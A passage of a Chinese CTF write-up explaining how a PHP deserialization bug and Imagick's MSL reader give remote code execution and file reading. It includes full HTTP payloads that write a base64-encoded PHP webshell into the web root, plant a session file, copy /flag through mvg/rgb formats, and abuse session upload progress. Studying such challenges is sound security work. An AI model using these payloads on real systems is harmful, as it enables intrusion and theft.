+--------------------------c32aaddf3d8fd979
+<span class="token header-name keyword">Content-Disposition:</span> form-data; name="whatever"; filename="whatever"
+<span class="token header-name keyword">Content-Type:</span> application/octet-stream
+
+&lt;?xml version="1.0" encoding="UTF-8"?>
+&lt;image>
+ &lt;read filename="inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4=" />
+ &lt;write filename="/var/www/html/b.php" />
+&lt;/image>
+--------------------------c32aaddf3d8fd979--
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>RCE</code></p>
+<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687795236160.png" alt="1687795236160"></p>
+<p>当然，一般情况下<code>web</code>目录没法写，这题也是，只不过为了测试改了权限。</p>
+<p>此题的正确解法是想办法触发<code>__sleep</code>从而把<code>flag</code>读出来。</p>
+<p>要触发<code>__sleep</code>必须要序列化，因此该题只能搞个<code>session</code>序列化从而触发<code>__sleep</code>了。</p>
+<p>而<code>php</code>的<code>session</code>是在<code>tmp</code>目录下存放的，该目录一般都可写，并且名称是可控的。</p>
+<pre class="line-numbers language-php"><code class="language-php">
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">fumo_backdoor</span>           <span class="token comment" spellcheck="true">//生成ppm格式的session内容</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> 
+    <span class="token keyword">public</span> <span class="token variable">$argv</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$fumo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fumo_backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$fumo</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">path</span> <span class="token operator">=</span> <span class="token string">"/tmp/squirt1e"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//readfile读取的文件，此时是空的。</span>
+<span class="token variable">$serialized</span> <span class="token operator">=</span> <span class="token string">"|"</span> <span class="token punctuation">.</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$fumo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"P6\n9 9\n255\n"</span> <span class="token punctuation">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$serialized</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$serialized</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>数据包</strong></p>
+<pre class="line-numbers language-http"><code class="language-http">POST /?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A17%3A%22vid%3Amsl%3A%2Ftmp%2Fphp%2A%22%3Bs%3A4%3A%22func%22%3BN%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D HTTP/1.1
+<span class="token header-name keyword">Host:</span> 127.0.0.1:18080
+<span class="token header-name keyword">Cache-Control:</span> max-age=0
+<span class="token header-name keyword">Content-Length:</span> 709
+<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979
+
+--------------------------c32aaddf3d8fd979
+<span class="token header-name keyword">Content-Disposition:</span> form-data; name="whatever"; filename="whatever"
+<span class="token header-name keyword">Content-Type:</span> application/octet-stream
+
+&lt;?xml version="1.0" encoding="UTF-8"?>
+&lt;image>
+ &lt;read filename="inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBfE86MTM6ImZ1bW9fYmFja2Rvb3IiOjQ6e3M6NDoicGF0aCI7czoxMzoiL3RtcC9zcXVpcnQxZSI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30=" />
+ &lt;write filename="/tmp/sess_squirt1e" />
+&lt;/image>
+--------------------------c32aaddf3d8fd979--
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>写成功。</p>
+<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687795786583.png" alt="1687795786583"></p>
+<p>接下来就要把<code>flag</code>带到<code>/tmp/squirt1e</code>中，因为题目设置了<code>open_basedir</code>，没办法直接读。我们需要找到一个对文件头要求不严格的文件协议并手动指定，因为<code>flag</code>不是图片，通过<code>Imagick</code>移动会导致报错。</p>
+<p>最终发现<code>mvg</code>、<code>uyvy</code>、<code>RGB</code>三种格式可以利用。</p>
+<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687796509728.png" alt="1687796509728"></p>
+<p>前两个亲测可用。</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mvg:/flag<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/tmp/squirt1e<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最后一个参考作者的<code>exp</code>没成功，记录一下吧，万一以后用得到呢。</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- step2: copy flag --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 设置为RGB格式，读取flag --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 设置⼀个空图⽚ --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 将空图⽚和flag数据进⾏拼接 --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 添加偏移后，读取flag --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 将上⼀张图⽚和这次读取的flag进⾏拼接 --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 不断重复，如果读取超出范围，便会报错，并留下上⼀次写⼊的⽂件 --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+2<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+3<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+3<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+4<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+4<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+5<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+5<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="一些脏trick"><a href="#一些脏trick" class="headerlink" title="一些脏trick"></a>一些脏trick</h3><h4 id="php-session-not-started"><a href="#php-session-not-started" class="headerlink" title="php session not started"></a>php session not started</h4><p>想办法整个session，利⽤SESSION UPLOAD PROGRESS创建⼀个 session，这样就可以看到源码了</p>
+<pre class="line-numbers language-http"><code class="language-http">POST / HTTP/1.1
+<span class="token header-name keyword">Host:</span> 115.239.215.75:8081
+<span class="token header-name keyword">Cookie:</span> PHPSESSID=1
+<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9
+<span class="token header-name keyword">Connection:</span> close
+<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=------------------------c32aaddf3d8fd979
+<span class="token header-name keyword">Content-Length:</span> 204
+
+--------------------------c32aaddf3d8fd979
+<span class="token header-name keyword">Content-Disposition:</span> form-data; name="PHP_SESSION_UPLOAD_PROGRESS";
+<span class="token header-name keyword">Content-Type:</span> application/octet-stream
+
+1
+--------------------------c32aaddf3d8fd979--
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="绕过md5以及sha1强比较"><a href="#绕过md5以及sha1强比较" class="headerlink" title="绕过md5以及sha1强比较"></a>绕过md5以及sha1强比较</h4><p>利用 Error&#x2F;Exception 内置类进行hash绕过。</p>
+<p><code>$a = new Error(&quot;null&quot;,1);$b = new Error(&quot;null&quot;,1);</code></p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>版权所有 © 2020 | 作者: Squirt1e | 主题 By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
